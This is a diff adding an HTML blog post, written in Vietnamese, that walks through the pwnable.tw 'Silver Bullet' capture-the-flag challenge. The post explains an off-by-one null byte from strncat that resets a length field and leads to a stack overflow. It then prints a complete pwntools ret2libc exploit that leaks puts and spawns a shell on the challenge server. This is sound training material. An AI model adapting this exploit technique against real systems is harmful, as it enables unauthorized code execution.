@@ -1,0 +1,177 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[Pwnable.tw] – Silver Bullet // DatNLQ</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.88.1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="DatNLQ" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://datnlq.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Pwnable.tw] – Silver Bullet"/>
+<meta name="twitter:description" content="[Pwnable.tw] – Silver Bullet main() create_bullet() Tạo một viên đạn BULLET *bullet có tên là bullet.desc dài tối đa 0x30 kí tự do người dùng nhập vào, set power của bullet là bullet.power = len(bullet.desc).
+power_up() Ta có thể tăng sức mạnh cho bullet bằng cách nối dài thêm desc, bullet.power sẽ được cập nhật lại là chiều dài của tên mới. Chiều dài tối đa của bullet.desc vẫn là 0x30"/>
+
+    <meta property="og:title" content="[Pwnable.tw] – Silver Bullet" />
+<meta property="og:description" content="[Pwnable.tw] – Silver Bullet main() create_bullet() Tạo một viên đạn BULLET *bullet có tên là bullet.desc dài tối đa 0x30 kí tự do người dùng nhập vào, set power của bullet là bullet.power = len(bullet.desc).
+power_up() Ta có thể tăng sức mạnh cho bullet bằng cách nối dài thêm desc, bullet.power sẽ được cập nhật lại là chiều dài của tên mới. Chiều dài tối đa của bullet.desc vẫn là 0x30" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://datnlq.github.io/posts/silverbullet/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-24T13:51:36+07:00" />
+<meta property="article:modified_time" content="2021-12-24T13:51:36+07:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://datnlq.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="DatNLQ" /></a>
+      <h1>DatNLQ</h1>
+      <p>DatNLQ&#39;s personal website</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/datnlq" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[Pwnable.tw] – Silver Bullet</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 24, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="pwnabletw--silver-bullethttpspwnabletwchallenge6">[Pwnable.tw] – <a href="https://pwnable.tw/challenge/#6">Silver Bullet</a></h2>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet_checksec.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet_test.png?raw=true" alt="img"></p>
+<h4 id="main">main()</h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet_main.png?raw=true" alt="img"></p>
+<h4 id="create_bullet">create_bullet()</h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet_createbullet.png?raw=true" alt="img"></p>
+<p>Tạo một viên đạn BULLET *bullet có tên là bullet.desc dài tối đa 0x30 kí tự do người dùng nhập vào, set power của bullet là bullet.power = len(bullet.desc).</p>
+<h4 id="power_up">power_up()</h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet_powerup.png?raw=true" alt="img"></p>
+<p>Ta có thể tăng sức mạnh cho bullet bằng cách nối dài thêm desc, bullet.power sẽ được cập nhật lại là chiều dài của tên mới. Chiều dài tối đa của bullet.desc vẫn là 0x30</p>
+<h4 id="beat">beat()</h4>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet_beat.png?raw=true" alt="img"></p>
+<p>Tiến hành bắn sói, sức mạnh của bullet.power nếu nhiều hơn máu cảu sói thì chiến thắng.</p>
+<p>struct bullet
+{
+char desc[0x30];
+int power;
+}</p>
+<p>struct WereWolf
+{
+int power ;
+char *desc;
+}</p>
+<p>Sau khi đọc và test thử nhiều lần mình thấy được 1 hàm có thể có lỗi trong hàm power_up(). Hàm strncat() sẽ copy chuỗi desc vào chuỗi bullet.desc, sau đó sẽ thêm 1 ký tự NULL vào cuối chuỗi. Giả sử desc bullet đầu tiên có size là 0x2f, sử dụng hàm power_up() để thêm 0x1 vào desc và hàm strncat() sẽ thêm 1 null byte vào cuối chuỗi và đè lên biến tiếp theo, mà vị trí tiếp theo lại là bullet size. Chúng ta có thể xem các bước debug dưới đây :</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet_debug.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet_stack.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet_debug1.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet_debug2.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet_debug3.png?raw=true" alt="img"></p>
+<p>Điều đó có nghĩa là size hiện tại đã bị đè thành 0 + 1 bytes vừa thêm thì sẽ là 1. Chúng ta có thể đè thêm 0x2f nữa và điều này có thể giúp chúng ta control được ret.</p>
+<p>Đề bài cho file libc_32.so.6, nên mình nghĩ đó là 1 gợi ý để ta dùng kĩ thuật ret2libc.</p>
+<p>Ta sẽ overwrite return address thành hàm puts() với tham số là  hàm puts.got mục đích là để chương trình in ra địa chỉ của hàm puts sau khi được load vào vùng .GOT. Tuy nhiên chúng ta cũng phải chèn địa chỉ hàm main vào để có thể tạo loop như sau:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">def loop(fun,param):
+    create(&#39;A&#39;*0x20)
+    power(&#39;B&#39;*0x10)
+    power(p32(0x7FFFFFFF) + b&#34;A&#34;*3 + p32(put_plt) + p32(main) + p32(put_got))
+    beat()
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+#libc = ELF(&#39;/lib/i386-linux-gnu/libc-2.31.so&#39;)
+libc = ELF(&#39;./libc_32.so.6&#39;)
+elf = ELF(&#39;./silver_bullet&#39;)
+
+main = elf.symbols[&#34;main&#34;] #0x8048954 
+puts_plt = elf.plt[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+# sysem = libc.symbols[&#39;system&#39;]
+# bin_sh = next(libc.search(b&#39;/bin/sh&#39;))
+
+
+def create(desc):
+    io.sendlineafter(&#34;Your choice :&#34;,&#39;1&#39;)
+    io.sendafter(&#34;Give me your description of bullet :&#34;,desc)
+
+def power(desc):
+    io.sendlineafter(&#34;Your choice :&#34;,&#39;2&#39;)
+    io.sendafter(&#34;bullet :&#34;,desc)
+
+def beat():
+    io.sendlineafter(&#34;Your choice :&#34;,&#39;3&#39;)
+
+
+def loop(fun,param):
+    create(&#39;A&#39;*0x20)
+    power(&#39;B&#39;*0x10)
+    power(p32(0x7FFFFFFF) + b&#34;A&#34;*3 + p32(fun) + p32(main) + p32(param))
+    beat()
+
+
+def exploit():
+    loop(puts_plt,puts_got)
+
+    io.recvuntil(&#39;Oh ! You win !!\n&#39;)
+    puts = u32(io.recvuntil(&#39;\n&#39;)[0:4])
+    # puts = io.recvuntil(&#39;\n&#39;)
+    print(&#39;puts: &#39;+hex(puts))
+    libc_base = puts - libc.symbols[&#39;puts&#39;]
+    system = libc_base + libc.symbols[&#39;system&#39;]
+    bin_sh = libc_base + next(libc.search(b&#39;/bin/sh&#39;))
+    print(&#34;Libc base: &#34;+hex(libc_base))
+    print(&#34;System: &#34;+hex(system))
+    print(&#34;Bin sh: &#34;+hex(bin_sh))
+    loop(system,bin_sh)
+    io.interactive()
+
+
+
+
+debug = 0
+context.log_level = &#34;DEBUG&#34;
+if debug:
+    io = process(&#34;./silver_bullet&#34;)
+else:
+    io = remote(&#39;chall.pwnable.tw&#39;,10103)
+
+exploit()
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/silver_bullet/silver_bullet_flag.png?raw=true" alt="img"></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
